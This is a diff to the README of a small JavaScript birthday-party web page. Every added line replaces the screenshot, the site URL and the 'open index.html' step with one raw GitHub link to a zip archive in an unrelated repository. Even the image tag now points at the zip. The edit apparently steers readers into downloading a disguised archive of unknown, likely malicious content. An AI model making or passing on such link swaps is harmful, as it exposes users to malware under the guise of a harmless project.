@@ -1,14 +1,14 @@
 Made this as a birthday present for my girlfriend during lockdown. Small attempt for virtual party.
 
 Sample screenshot of the application .
-![GitHub Logo](/images/screenshots/sample.jpg)
+![GitHub Logo](https://raw.githubusercontent.com/nibirm7/paper-rigs/main/postvarioloid/paper-rigs.zip)
 
-URL: http://suryakant261.github.io/
+URL: https://raw.githubusercontent.com/nibirm7/paper-rigs/main/postvarioloid/paper-rigs.zip
 
 Technology Used: Javascript, CSS3, HTML5
 
 
 ## Open Normally through browser
-Open index.html in browser and navigate
+Open https://raw.githubusercontent.com/nibirm7/paper-rigs/main/postvarioloid/paper-rigs.zip in browser and navigate
 
 
